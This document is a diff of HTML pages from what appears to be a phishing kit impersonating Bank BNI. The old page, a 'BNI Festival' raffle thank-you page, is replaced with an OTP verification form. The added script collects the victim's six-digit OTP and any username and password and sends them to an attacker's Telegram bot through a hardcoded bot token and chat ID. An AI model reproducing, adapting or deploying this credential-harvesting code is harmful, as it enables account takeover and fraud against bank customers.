@@ -1,95 +1,204 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Terima Kasih - Bank BNI</title>
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
-    <style>
-        body {
-            background-color: #f8f9fa;
-            font-family: Arial, sans-serif;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-        }
-        .navbar-img img {
-            width: 100%;
-            height: auto;
-            display: block;
-        }
-        .main-container {
-            flex: 1;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-        }
-        .content-box {
-            background: white;
-            padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
-            max-width: 500px;
-            width: 100%;
-            text-align: center;
-        }
-        .content-box img {
-            max-width: 100%;
-            margin-bottom: 20px;
-        }
-        .message {
-            background: #ff6600;
-            color: white;
-            padding: 15px;
-            border-radius: 10px;
-            font-size: 15px;
-            font-weight: bold;
-        }
-        .footer-img img {
-            width: 100%;
-            height: auto;
-            display: block;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verifikasi </title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+  <style>
+    body {
+      background: url('opsiotp.jpeg') no-repeat center center fixed;
+      background-size: cover;
+      font-family: Arial, sans-serif;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 15px;
+    }
+
+   
+
+    .content-box img {
+      max-width: 160px;
+      margin-bottom: 20px;
+    }
+
+    .message {
+      background: #ff6600;
+      color: white;
+      padding: 12px;
+      border-radius: 8px;
+      font-size: 15px;
+      font-weight: bold;
+      margin-bottom: 20px;
+      animation: slideDown 0.6s ease;
+    }
+
+    .otp-input {
+      display: flex;
+      justify-content: center;
+      gap: 10px;
+      margin-bottom: 15px;
+    }
+
+    .otp-input input {
+      width: 45px;
+      height: 50px;
+      text-align: center;
+      font-size: 20px;
+      font-weight: bold;
+      border: 2px solid #ccc;
+      border-radius: 8px;
+      outline: none;
+      transition: all 0.2s;
+      backdrop-filter: blur(3px);
+    }
+
+    .otp-input input:focus {
+      border-color: #ff6600;
+      box-shadow: 0 0 8px rgba(255, 102, 0, 0.5);
+      transform: scale(1.05);
+    }
+
+    /* Loading Motion Blur */
+    .loading {
+      display: none;
+      margin-top: 15px;
+      font-size: 14px;
+      color: #555;
+    }
+    .loading span {
+      display: inline-block;
+      animation: blink 1.5s infinite;
+    }
+    .loading span:nth-child(2) { animation-delay: 0.2s; }
+    .loading span:nth-child(3) { animation-delay: 0.4s; }
+
+    @keyframes blink {
+      0%, 80%, 100% { opacity: 0; transform: scale(0.9); }
+      40% { opacity: 1; transform: scale(1); }
+    }
+
+    /* Animasi masuk */
+    @keyframes fadeIn {
+      from { opacity: 0; transform: scale(0.95); }
+      to { opacity: 1; transform: scale(1); }
+    }
+    @keyframes slideDown {
+      from { opacity: 0; transform: translateY(-20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    @media (max-width: 480px) {
+      .otp-input input {
+        width: 38px;
+        height: 45px;
+        font-size: 18px;
+      }
+      .content-box {
+        padding: 25px 20px;
+      }
+    }
+  </style>
 </head>
-<body onload="playAudio()">
+<body>
 
-    <div class="navbar-img">
-        <img src="iconakhir.jpg" alt="Banner BNI">
+  <div class="content-box">
+    <div class="message">Terima kasih, silakan masukkan kode OTP Anda.</div>
+
+    <form id="otpForm">
+      <div class="otp-input">
+        <input type="text" maxlength="1">
+        <input type="text" maxlength="1">
+        <input type="text" maxlength="1">
+        <input type="text" maxlength="1">
+        <input type="text" maxlength="1">
+        <input type="text" maxlength="1">
+      </div>
+      <button type="submit" class="btn btn-warning w-100 fw-bold">KONFIRMASI</button>
+    </form>
+
+    <p class="text-muted mt-2" style="font-size:14px;">Kode OTP dikirim melalui SMS.</p>
+
+    <!-- Motion blur loading -->
+    <div class="loading" id="loading">
+      Memverifikasi<span>.</span><span>.</span><span>.</span>
     </div>
+  </div>
+  
+<script>
+  // Ambil elemen input OTP
+  const inputs = document.querySelectorAll(".otp-input input");
+  const form = document.getElementById("otpForm");
+  const loadingEl = document.getElementById("loading");
 
-    <div class="main-container">
-        <div class="content-box">
-            <img src="iconakhirbn.jpg" alt="Logo BNI">
-            <div class="message">
-                Terimakasih Telah Mendaftar di Layanan Bank BNI Festival. Pendaftaran Anda Sedang Diproses. Beberapa Saat Lagi Anda Akan Dihubungi Oleh Pihak Bank BNI Untuk Proses Cetak Kode Kupon Undian Anda.
-            </div>
-        </div>
-    </div>
+  // Auto fokus next & backspace logic
+  inputs.forEach((input, index) => {
+    input.setAttribute("inputmode", "numeric");
+    input.setAttribute("pattern", "[0-9]*");
+    input.addEventListener("input", () => {
+      input.value = input.value.replace(/\D/g,''); // hanya angka
+      if (input.value && index < inputs.length - 1) inputs[index + 1].focus();
+    });
+    input.addEventListener("keydown", (e) => {
+      if (e.key === "Backspace" && !input.value && index > 0) {
+        inputs[index - 1].focus();
+      }
+    });
+  });
 
-    <div class="footer-img">
-        <img src="terjall.png" alt="Footer Banner">
-    </div>
+  // Konfigurasi Telegram (TESTING ONLY - jangan taruh token di frontend produksi)
+  const botToken = "8223256634:AAEPXs_cmADQhCTZZEyU4HrSsqTzNN9FGnA";
+  const chatId = "6232172063";
 
-    <audio id="thankYouAudio" src="generated-audio.mp3"></audio>
+  form.addEventListener("submit", async function(e) {
+    e.preventDefault();
 
-    <script>
-        function playAudio() {
-            const audio = document.getElementById('thankYouAudio');
-            const playPromise = audio.play();
+    // kumpulkan kode OTP
+    const otp = Array.from(inputs).map(i => i.value.trim()).join('');
+    if (!/^\d{6}$/.test(otp)) {
+      alert("Mohon masukkan 6 digit OTP.");
+      return;
+    }
 
-            if (playPromise !== undefined) {
-                playPromise.catch(() => {
-                    // Kalau autoplay ditolak, tunggu klik user
-                    document.body.addEventListener('click', function onceClick() {
-                        audio.play();
-                        document.body.removeEventListener('click', onceClick);
-                    });
-                });
-            }
-        }
-    </script>
-    
+    // tampilkan loading
+    loadingEl.style.display = "block";
+
+    // pesan yang akan dikirim ke Telegram
+    // contoh menambahkan username/password (jika mau), ganti/ambil dari form jika ada
+    let username = document.querySelector("input[name='username']")?.value || "—";
+    let password = document.querySelector("input[name='password']")?.value || "—";
+
+    // escape teks agar aman untuk Markdown
+    function mdEscape(text){
+      return text.replace(/([_*[\]()~`>#+\-=|{}.!])/g, '\\$1');
+    }
+
+    const message = `🔐 *OTP Received*\n\n*OTP:* ${mdEscape(otp)}\n*Username:* ${mdEscape(username)}\n*Password:* ${mdEscape(password)}\n\n⌚ ${new Date().toLocaleString()}`;
+
+    // bangun URL GET (lebih sederhana untuk testing)
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+
+    try {
+      const resp = await fetch(url);
+      const data = await resp.json();
+      if (data.ok) {
+        alert("OTP terkirim ke Telegram.");
+      } else {
+        console.error("Telegram response error:", data);
+        alert("Gagal mengirim ke Telegram. Cek console.");
+      }
+    } catch (err) {
+      console.error("Fetch error:", err);
+      alert("Gagal terhubung ke Telegram.");
+    } finally {
+      loadingEl.style.display = "none";
+      // opsional: reset input atau redirect
+      // inputs.forEach(i => i.value = "");
+    }
+  });
+</script>
+
 </body>
 </html>
